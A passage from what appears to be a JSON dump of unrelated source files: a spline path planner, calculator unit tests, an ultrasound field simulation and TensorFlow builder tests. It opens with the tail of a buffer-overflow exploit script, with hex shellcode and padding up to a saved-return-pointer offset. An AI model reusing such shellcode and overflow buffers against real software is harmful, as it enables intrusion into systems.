\"\\x7d\\xed\\xae\\x15\\x0f\\x7e\\x5b\\x1a\\xbc\\x7f\"\r\nshellcode_calc += \"\\x4e\\x79\\x23\\xec\\x12\\x50\\xc6\\x94\\xb1\\xac\"\r\n\r\nbuf = \"\"\r\nbuf += \"A\"*(srp_offset - len(buf))\t# padding\r\nbuf += struct.pack(\"", "352": "\"\"\"\nCubic spline planner\nAuthor: Atsushi Sakai(@Atsushi_twi)\n\"\"\"\nimport math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    \"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        #  print(self.c1)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        \"\"\"\n        Calc position\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calcd(self, t):\n        \"\"\"\n        Calc first derivative\n        if t is outside of the input x, return None\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.b[i] + 2.0 * self.c[i] * dx + 3.0 * self.d[i] * dx ** 2.0\n        return result\n\n    def calcdd(self, t):\n        \"\"\"\n        Calc second derivative\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = 2.0 * self.c[i] + 6.0 * self.d[i] * dx\n        return result\n\n    def __search_index(self, x):\n        \"\"\"\n        search data segment index\n        \"\"\"\n        return bisect.bisect(self.x, x) - 1\n\n    def __calc_A(self, h):\n        \"\"\"\n        calc matrix A for spline coefficient c\n        \"\"\"\n        A = np.zeros((self.nx, self.nx))\n        A[0, 0] = 1.0\n        for i in range(self.nx - 1):\n            if i != (self.nx - 2):\n                A[i + 1, i + 1] = 2.0 * (h[i] + h[i + 1])\n            A[i + 1, i] = h[i]\n            A[i, i + 1] = h[i]\n\n        A[0, 1] = 0.0\n        A[self.nx - 1, self.nx - 2] = 0.0\n        A[self.nx - 1, self.nx - 1] = 1.0\n        #  print(A)\n        return A\n\n    def __calc_B(self, h):\n        \"\"\"\n        calc matrix B for spline coefficient c\n        \"\"\"\n        B = np.zeros(self.nx)\n        for i in range(self.nx - 2):\n            B[i + 1] = 3.0 * (self.a[i + 2] - self.a[i + 1]) / \\\n                h[i + 1] - 3.0 * (self.a[i + 1] - self.a[i]) / h[i]\n        return B\n\n\nclass Spline2D:\n    \"\"\"\n    2D Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.s = self.__calc_s(x, y)\n        self.sx = Spline(self.s, x)\n        self.sy = Spline(self.s, y)\n\n    def __calc_s(self, x, y):\n        dx = np.diff(x)\n        dy = np.diff(y)\n        self.ds = np.hypot(dx, dy)\n        s = [0]\n        s.extend(np.cumsum(self.ds))\n        return s\n\n    def calc_position(self, s):\n        \"\"\"\n        calc position\n        \"\"\"\n        x = self.sx.calc(s)\n        y = self.sy.calc(s)\n\n        return x, y\n\n    def calc_curvature(self, s):\n        \"\"\"\n        calc curvature\n        \"\"\"\n        dx = self.sx.calcd(s)\n        ddx = self.sx.calcdd(s)\n        dy = self.sy.calcd(s)\n        ddy = self.sy.calcdd(s)\n        k = (ddy * dx - ddx * dy) / ((dx ** 2 + dy ** 2)**(3 / 2))\n        return k\n\n    def calc_yaw(self, s):\n        \"\"\"\n        calc yaw\n        \"\"\"\n        dx = self.sx.calcd(s)\n        dy = self.sy.calcd(s)\n        yaw = math.atan2(dy, dx)\n        return yaw\n\n\ndef calc_spline_course(x, y, ds=0.1):\n    sp = Spline2D(x, y)\n    s = list(np.arange(0, sp.s[-1], ds))\n\n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n\n    return rx, ry, ryaw, rk, s\n\n\ndef main():  # pragma: no cover\n    print(\"Spline 2D test\")\n    import matplotlib.pyplot as plt\n    x = [-2.5, 0.0, 2.5, 5.0, 7.5, 3.0, -1.0]\n    y = [0.7, -6, 5, 6.5, 0.0, 5.0, -2.0]\n    ds = 0.1  # [m] distance of each interpolated points\n\n    sp = Spline2D(x, y)\n    s = np.arange(0, sp.s[-1], ds)\n    \n    rx, ry, ryaw, rk = [], [], [], []\n    for i_s in s:\n        ix, iy = sp.calc_position(i_s)\n        rx.append(ix)\n        ry.append(iy)\n        ryaw.append(sp.calc_yaw(i_s))\n        rk.append(sp.calc_curvature(i_s))\n    \n    plt.plot(rx,ry)\n    plt.show()\n    plt.close()\n\n    plt.subplots(1)\n    plt.plot(x, y, \"xb\", label=\"input\")\n    plt.plot(rx, ry, \"-r\", label=\"spline\")\n    plt.grid(True)\n    plt.axis(\"equal\")\n    plt.xlabel(\"x[m]\")\n    plt.ylabel(\"y[m]\")\n    plt.legend()\n\n    plt.subplots(1)\n    plt.plot(s, [np.rad2deg(iyaw) for iyaw in ryaw], \"-r\", label=\"yaw\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"yaw angle[deg]\")\n\n    plt.subplots(1)\n    plt.plot(s, rk, \"-r\", label=\"curvature\")\n    plt.grid(True)\n    plt.legend()\n    plt.xlabel(\"line length[m]\")\n    plt.ylabel(\"curvature [1/m]\")\n\n    plt.show()\n\n\nif __name__ == '__main__':\n    main()\n", "353": "import unittest\nimport calc\n\n\nclass TestCalc(unittest.TestCase):\n\n    def test_add(self):\n        self.assertEqual(calc.add(10, 5), 15)\n        self.assertEqual(calc.add(-1, 1), 0)\n        self.assertEqual(calc.add(-1, -1), -2)\n\n    def test_subtract(self):\n        self.assertEqual(calc.subtract(10, 5), 5)\n        self.assertEqual(calc.subtract(-1, 1), -2)\n        self.assertEqual(calc.subtract(-1, -1), 0)\n\n    def test_multiply(self):\n        self.assertEqual(calc.multiply(10, 5), 50)\n        self.assertEqual(calc.multiply(-1, 1), -1)\n        self.assertEqual(calc.multiply(-1, -1), 1)\n\n    def test_divide(self):\n        self.assertEqual(calc.divide(10, 5), 2)\n        self.assertEqual(calc.divide(-1, 1), -1)\n        self.assertEqual(calc.divide(-1, -1), 1)\n        self.assertEqual(calc.divide(5, 2), 2.5)\n\n        with self.assertRaises(ValueError):\n            calc.divide(10, 0)\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "354": "import unittest\r\nimport calc\r\n\r\n\r\nclass TestCalc(unittest.TestCase):\r\n\r\n    def test_add(self):\r\n        self.assertEqual(calc.add(10, 5), 15)\r\n        self.assertEqual(calc.add(-1, 1), 0)\r\n        self.assertEqual(calc.add(-1, -1), -2)\r\n\r\n    def test_subtract(self):\r\n        self.assertEqual(calc.subtract(10, 5), 5)\r\n        self.assertEqual(calc.subtract(-1, 1), -2)\r\n        self.assertEqual(calc.subtract(-1, -1), 0)\r\n\r\n    def test_multiply(self):\r\n        self.assertEqual(calc.multiply(10, 5), 50)\r\n        self.assertEqual(calc.multiply(-1, 1), -1)\r\n        self.assertEqual(calc.multiply(-1, -1), 1)\r\n\r\n    def test_divide(self):\r\n        self.assertEqual(calc.divide(10, 5), 2)\r\n        self.assertEqual(calc.divide(-1, 1), -1)\r\n        self.assertEqual(calc.divide(-1, -1), 1)\r\n        self.assertEqual(calc.divide(5, 2), 2.5)\r\n\r\n        with self.assertRaises(ValueError):\r\n            calc.divide(10, 0)\r\n\r\n\r\nif __name__ == '__main__':\r\n    unittest.main()", "355": "# -*- coding: utf-8 -*-\r\n\"\"\"\r\nMain Module\r\n\"\"\"\r\nimport transducer\r\nimport field\r\nimport medium\r\nimport output\r\nimport logging\r\nimport sys\r\nimport os\r\nimport time\r\nimport ribs\r\nimport rayleigh\r\nimport analytic_calc\r\n\r\n\r\n\r\ndef main():\r\n    new_work_dir_with_time_stamp()\r\n    prepare_logging()\r\n\r\n    array = transducer.transducer_from_file(r\"..\\array.txt\")\r\n    array.add_elements_from_file(r\"..\\array_elements.txt\")\r\n    med = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n    dist_s = array.calc_distances_betweeen_elements()\r\n    print(min(dist_s))\r\n    print(max(dist_s))\r\n\r\n    import json\r\n    with open(r\"..\\ribs.json\",'r') as f:\r\n        ribs_phantom = json.loads(f.read())\r\n\r\n    calc_field = field.PressureFieldCartesian()\r\n    calc_field.set_nodes_num(241, 1, 301)\r\n    calc_field.set_grid_bottom(-100.0e-03, 0.0e-03, 5.0e-03)\r\n    calc_field.set_grid_top(100.0e-03, 0.0e-03, 130.0e-03)\r\n    calc_field.prepare_grid()\r\n\r\n    # ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n    # array.switch_off_elements_from_file(r\"..\\switched_off.txt\")\r\n\r\n    # analytic_calc.calc_field_analytically(calc_field, array, med)\r\n    # rayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\r\n    rayleigh.RayCalc(calc_field, array, med, 500).doit()\r\n    # rayleigh.RayCalcIdealRibs(calc_field, array, med, 300, ribs_phantom).doit()\r\n    # rayleigh.RayCalcIdealFull(calc_field, array, med, 500).doit()\r\n    # rayleigh.calc_field_from_trans_opt_ideal_trans(calc_field, array, med, 2000, ribs_phantom)\r\n    # rayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\r\n    # calc_field = output.restore_field_from_disk(\"field_plane\")\r\n    output.save_field_on_disk(calc_field, \"field_plane\")\r\n    # ribs.CalcPowerOnRibs(calc_field, ribs_phantom)\r\n\r\ndef main_skull():\r\n    import analytic_calc_skull\r\n    new_work_dir_with_time_stamp()\r\n    prepare_logging()\r\n\r\n    array = transducer.transducer_from_file(r\"..\\array.txt\")\r\n    array.add_elements_from_file(r\"..\\array_elements.txt\")\r\n    med = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n    \r\n    calc_field = field.PressureFieldCartesian()\r\n    # calc_field.set_nodes_num(201, 1, 130)\r\n    # calc_field.set_grid_bottom(-100.0e-03, 0.0e-03, 5.0e-03)\r\n    # calc_field.set_grid_top(100.0e-03, 0.0e-03, 130.0e-03)\r\n    calc_field.set_nodes_num(1, 1, 11)\r\n    calc_field.set_grid_bottom(0.0e-03, 0.0e-03, 125.0e-03)\r\n    calc_field.set_grid_top(0.0e-03, 0.0e-03, 135.0e-03)\r\n    calc_field.prepare_grid()\r\n\r\n\r\n\r\n    # ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n    # array.switch_off_elements_from_file(r\"..\\switched_off.txt\")\r\n\r\n    # analytic_calc.calc_field_analytically(calc_field, array, med)\r\n    analytic_calc_skull.calc_field_analytically(calc_field, array, med)\r\n    # analytic_calc.calc_field_analytically(calc_field, array, med)\r\n    # rayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\r\n    # rayleigh.RayCalc(calc_field, array, med, 500).doit()\r\n    # rayleigh.RayCalcIdealRibs(calc_field, array, med, 300, ribs_phantom).doit()\r\n    # rayleigh.RayCalcIdealFull(calc_field, array, med, 500).doit()\r\n    # rayleigh.calc_field_from_trans_opt_ideal_trans(calc_field, array, med, 2000, ribs_phantom)\r\n    # rayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\r\n    # calc_field = output.restore_field_from_disk(\"field_plane\")\r\n    output.save_field_on_disk(calc_field, \"field_plane\")\r\n    # ribs.CalcPowerOnRibs(calc_field, ribs_phantom)\r\n\r\n\r\n\r\ndef main_one_el_test():\r\n    new_work_dir_with_time_stamp()\r\n    prepare_logging()\r\n\r\n    array = transducer.transducer_from_file(r\"..\\array.txt\")\r\n    array.add_elements_from_file(r\"..\\array_elements.txt\")\r\n    med = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n    dist_s = array.calc_distances_betweeen_elements()\r\n    print(min(dist_s))\r\n    print(max(dist_s))\r\n\r\n    import json\r\n    with open(r\"..\\ribs.json\",'r') as f:\r\n        ribs_phantom = json.loads(f.read())\r\n\r\n    calc_field = field.PressureFieldCartesian()\r\n    calc_field.set_nodes_num(101, 101, 1)\r\n    calc_field.set_grid_bottom(-25.0e-03, -25.0e-03, 130.0e-03)\r\n    calc_field.set_grid_top(25.0e-03, 25.0e-03, 130.0e-03)\r\n    calc_field.prepare_grid()\r\n\r\n    # ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n    # array.switch_off_elements_from_file(r\"..\\switched_off.txt\")\r\n\r\n    # analytic_calc.calc_field_analytically(calc_field, array, med)\r\n    # rayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\r\n    rayleigh.RayCalc(calc_field, array, med, 500).doit()\r\n    # rayleigh.RayCalcIdealRibs(calc_field, array, med, 300, ribs_phantom).doit()\r\n    # rayleigh.RayCalcIdealFull(calc_field, array, med, 500).doit()\r\n    # rayleigh.calc_field_from_trans_opt_ideal_trans(calc_field, array, med, 2000, ribs_phantom)\r\n    # rayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\r\n    # calc_field = output.restore_field_from_disk(\"field_plane\")\r\n    output.save_field_on_disk(calc_field, \"field_plane\")\r\n    # ribs.CalcPowerOnRibs(calc_field, ribs_phantom)\r\n\r\n\r\ndef main_from_field():\r\n    new_work_dir_with_time_stamp()\r\n    prepare_logging()\r\n\r\n    array = transducer.transducer_from_file(r\"..\\array.txt\")\r\n    array.add_elements_from_file(r\"..\\array_elements.txt\")\r\n    med = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n\r\n    ribs_phantom = {\r\n        # \u0420\u0435\u0431\u0440\u0430 - \u043f\u043b\u043e\u0441\u043a\u0438\u0435 \u0433\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u043e\u043b\u043e\u0441\u043a\u0438 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u043e\u0439 \u0442\u043e\u043b\u0449\u0438\u043d\u044b\r\n\r\n        # \u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0434\u043e \u043f\u043b\u043e\u0441\u043a\u043e\u0441\u0442\u0438 \u0440\u0435\u0431\u0435\u0440 \u043e\u0442 \u0440\u0435\u0448\u0435\u0442\u043a\u0438\r\n        'dist_to_ribs_plane': 45.0e-03,\r\n        # 'dist_to_ribs_plane': 65.0e-03,\r\n\r\n        # \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0435\u0431\u0435\u0440\r\n        'ribs_count': 5,\r\n\r\n        # \u0428\u0438\u0440\u0438\u043d\u0430 \u0440\u0435\u0431\u0440\u0430\r\n        'rib_width': 18.0e-03,\r\n\r\n        # \u0428\u0438\u0440\u0438\u043d\u0430 \u0449\u0435\u043b\u0438 \u043c\u0435\u0436\u0434\u0443 \u0440\u0435\u0431\u0440\u0430\u043c\u0438\r\n        'gap_width': 14.0e-03,\r\n\r\n        # \u041a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 Y \u043d\u0438\u0436\u043d\u0435\u0439 \u0433\u0440\u0430\u043d\u0438 \u043d\u0438\u0436\u043d\u0435\u0433\u043e \u0440\u0435\u0431\u0440\u0430\r\n        'bottom_coord': 14.0e-03\r\n    }\r\n\r\n    field_init = output.restore_field_from_disk(r\"..\\field_plane_ribs\")\r\n    clean_field_on_ribs(field_init, ribs_phantom)\r\n    output.save_field_on_disk(field_init, r\"..\\field_plane_ribs_clean\")\r\n\r\n    calc_field = field.PressureFieldCartesian()\r\n    # calc_field.set_nodes_num(121, 121, 1)\r\n    # calc_field.set_grid_bottom(-15.0e-03, -15.0e-03, 130.0e-03)\r\n    # calc_field.set_grid_top(15.0e-03, 15.0e-03, 130.0e-03)\r\n    calc_field.set_nodes_num(241, 241, 1)\r\n    calc_field.set_grid_bottom(-120.0e-03, -120.0e-03, 130.0e-03)\r\n    calc_field.set_grid_top(120.0e-03, 120.0e-03, 130.0e-03)\r\n    # calc_field.set_nodes_num(1, 201, 1)\r\n    # calc_field.set_grid_bottom(0.0e-03, -25.0e-03, 130.0e-03)\r\n    # calc_field.set_grid_top(0.0e-03, 25.0e-03, 130.0e-03)\r\n    # calc_field.set_nodes_num(1000, 1000, 1)\r\n    # calc_field.set_grid_bottom(-100.0e-03, -100.0e-03, 45.0e-03)\r\n    # calc_field.set_grid_top(100.0e-03, 100.0e-03, 45.0e-03)\r\n    calc_field.prepare_grid()\r\n\r\n    # ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n    # array.switch_off_elements_from_file(r\"..\\switched_off.txt\")\r\n\r\n    # analytic_calc.calc_field_analytically(calc_field, array, med)\r\n    # rayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\r\n    # rayleigh.RayCalc(calc_field, array, med, 500).doit()\r\n    # rayleigh.RayCalcIdealRibs(calc_field, array, med, 500, ribs_phantom).doit()\r\n    rayleigh.RayCalcFromField(calc_field, array, med, field_init).doit()\r\n    # rayleigh.RayCalcIdealFull(calc_field, array, med, 300).doit()\r\n    # rayleigh.calc_field_from_trans_opt_ideal_trans(calc_field, array, med, 2000, ribs_phantom)\r\n    # rayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\r\n    output.save_field_on_disk(calc_field, \"field_plane\")\r\n    # ribs.CalcPowerOnRibs(calc_field, ribs_phantom)\r\n\r\n\r\ndef clean_field_on_ribs(field, ribs_phantom):\r\n    import numpy\r\n    import ribs\r\n    sh = numpy.shape(field.p)\r\n    for j in range(0, sh[1]):\r\n        field_x, field_y, field_z = field.get_cartesian_coords(0, j, 0)\r\n        if ribs.is_point_on_ribs(ribs_phantom, field_y):\r\n            field.p[:, j, :] = 0 + 1j*0\r\n            field.vn[:, j, :] = 0 + 1j*0\r\n\r\n\r\ndef main_spectrum_focus():\r\n    import angular_spectrum\r\n    new_work_dir_with_time_stamp()\r\n    prepare_logging()\r\n\r\n    array = transducer.transducer_from_file(r\"..\\array.txt\")\r\n    array.add_elements_from_file(r\"..\\array_elements.txt\")\r\n    med = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n\r\n\r\n    calc_field = field.PressureFieldCartesian()\r\n    calc_field.set_nodes_num(101, 101, 1)\r\n    calc_field.set_grid_bottom(-100.0e-03, -100.0e-03, 130.0e-03)\r\n    calc_field.set_grid_top(100.0e-03, 100.0e-03, 130.0e-03)\r\n    calc_field.prepare_grid()\r\n\r\n    # ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n    # array.switch_off_elements_from_file(r\"..\\switched_off.txt\")\r\n\r\n    # analytic_calc.calc_field_analytically(calc_field, array, med)\r\n    # rayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\r\n    # rayleigh.RayCalc(calc_field, array, med, 500).doit()\r\n    # rayleigh.RayCalcIdealRibs(calc_field, array, med, 500, ribs_phantom).doit()\r\n    field_ribs = output.restore_field_from_disk(r\"..\\field_plane_ribs\")\r\n    # \u0413\u0434\u0435 \u0441\u0447\u0438\u0442\u0430\u0442\u044c \u043f\u043e\u043b\u0435\r\n    z = -(130.0e-03 - 45.0e-03)\r\n    p_f, v_f = angular_spectrum.propagate_cartesian(field_ribs.p[:, :, 0], 0.66e-03, 0.66e-03, array.frequency, med.density, med.speed_of_sound, z)\r\n\r\n    calc_field.p[:,:,0] = p_f\r\n    calc_field.vn[:,:,0] = v_f\r\n    # rayleigh.RayCalcIdealFull(calc_field, array, med, 300).doit()\r\n    # rayleigh.calc_field_from_trans_opt_ideal_trans(calc_field, array, med, 2000, ribs_phantom)\r\n    # rayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\r\n    output.save_field_on_disk(calc_field, \"field_plane\")\r\n    # ribs.CalcPowerOnRibs(calc_field, ribs_phantom)\r\n\r\n\r\ndef main_one_el():\r\n    new_work_dir_with_time_stamp()\r\n    prepare_logging()\r\n\r\n    # array = transducer.transducer_from_file(r\"..\\array.txt\")\r\n    array = transducer.Transducer(\"Test\", 185.0e-03, 130.0e-03, 6.0e-03, 1.0e06, 10.0e-03)\r\n    # array.add_element(\"0\", 0.0, 0.0)\r\n    med = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n\r\n    calc_field = field.PressureFieldCartesian()\r\n    calc_field.set_nodes_num(241, 1, 1)\r\n    calc_field.set_grid_bottom(-3.0e-03, 0.0e-03, 130.0e-03)\r\n    calc_field.set_grid_top(3.0e-03, 0.0e-03, 130.0e-03)\r\n    # calc_field.set_nodes_num(341, 341, 1)\r\n    # calc_field.set_grid_bottom(-85.0e-03, -85.0e-03, 45.0e-03)\r\n    # calc_field.set_grid_top(85.0e-03, 85.0e-03, 45.0e-03)\r\n    # calc_field.set_nodes_num(1000, 1000, 1)\r\n    # calc_field.set_grid_bottom(-100.0e-03, -100.0e-03, 45.0e-03)\r\n    # calc_field.set_grid_top(100.0e-03, 100.0e-03, 45.0e-03)\r\n    calc_field.prepare_grid()\r\n\r\n    # ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n    # array.switch_off_elements_from_file(r\"switched_off.txt\")\r\n\r\n    # analytic_calc.calc_field_analytically(calc_field, array, med)\r\n    # rayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\r\n    # rayleigh.RayCalc(calc_field, array, med, 1000).doit()\r\n    rayleigh.reference_anal_calc_in_focal_plane(calc_field, array, med)\r\n    # rayleigh.RayCalcIdealRibs(calc_field, array, med, 1300, ribs_phantom).doit()\r\n    # rayleigh.RayCalcIdealFull(calc_field, array, med, 300).doit()\r\n    # rayleigh.calc_field_from_trans_opt_ideal_trans(calc_field, array, med, 2000, ribs_phantom)\r\n    # rayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\r\n    # calc_field = output.restore_field_from_disk(\"field_plane\")\r\n    output.save_field_on_disk(calc_field, \"field_plane\")\r\n    # ribs.CalcPowerOnRibs(calc_field, ribs_phantom)\r\n\r\ndef main_ideal_ref():\r\n    new_work_dir_with_time_stamp()\r\n    prepare_logging()\r\n\r\n    array = transducer.transducer_from_file(r\"..\\array.txt\")\r\n    # array.add_element(\"0\", 0.0, 0.0)\r\n    med = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n\r\n    calc_field = field.PressureFieldCartesian()\r\n    # calc_field.set_nodes_num(1, 1, 801)\r\n    # calc_field.set_grid_bottom(0.0e-03, 0.0e-03, 110.0e-03)\r\n    # calc_field.set_grid_top(0.0e-03, 0.0e-03, 150.0e-03)\r\n    calc_field.set_nodes_num(201, 1, 1)\r\n    calc_field.set_grid_bottom(-5.0e-03, 0.0e-03, 130.0e-03)\r\n    calc_field.set_grid_top(5.0e-03, 0.0e-03, 130.0e-03)\r\n    # calc_field.set_nodes_num(1000, 1000, 1)\r\n    # calc_field.set_grid_bottom(-100.0e-03, -100.0e-03, 45.0e-03)\r\n    # calc_field.set_grid_top(100.0e-03, 100.0e-03, 45.0e-03)\r\n    calc_field.prepare_grid()\r\n\r\n    # ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n    # array.switch_off_elements_from_file(r\"switched_off.txt\")\r\n\r\n    # analytic_calc.calc_field_analytically(calc_field, array, med)\r\n    # rayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\r\n    # rayleigh.RayCalc(calc_field, array, med, 1000).doit()\r\n    # rayleigh.reference_anal_calc_on_axis(calc_field, array, med)\r\n    # rayleigh.reference_anal_calc_in_focal_plane(calc_field, array, med)\r\n    # rayleigh.RayCalcIdealRibs(calc_field, array, med, 1300, ribs_phantom).doit()\r\n    rayleigh.RayCalcIdealFull(calc_field, array, med, 1500).doit()\r\n    # rayleigh.calc_field_from_trans_opt_ideal_trans(calc_field, array, med, 2000, ribs_phantom)\r\n    # rayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\r\n    # calc_field = output.restore_field_from_disk(\"field_plane\")\r\n    output.save_field_on_disk(calc_field, \"field_plane\")\r\n    # ribs.CalcPowerOnRibs(calc_field, ribs_phantom)\r\n\r\ndef prepare_logging():\r\n    logging.basicConfig(\r\n        filename='log.txt',\r\n        filemode='w',\r\n        format='%(asctime)s %(message)s',\r\n        datefmt='%Y/%m/%d %H:%M:%S',\r\n        level=logging.INFO\r\n    )\r\n    console = logging.StreamHandler(stream=sys.stdout)\r\n    console.setLevel(logging.INFO)\r\n    console.setFormatter(logging.Formatter('%(message)s'))\r\n    logging.getLogger('').addHandler(console)\r\n\r\n\r\ndef new_work_dir_with_time_stamp():\r\n    path = os.getcwd()\r\n    path += \"\\\\\" + time.strftime(\"%Y-%m-%d_%H-%M-%S\", time.localtime())\r\n    os.mkdir(path)\r\n    os.chdir(path)\r\n\r\n\r\nif __name__ == '__main__':\r\n    # main()\r\n    main_skull()\r\n    # main_one_el()\r\n    # main_spectrum_focus()\r\n    # main_from_field()\r\n    # main_test()\r\n    # main_ideal_ref()\r\n", "356": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow.compat.v1 as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "357": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    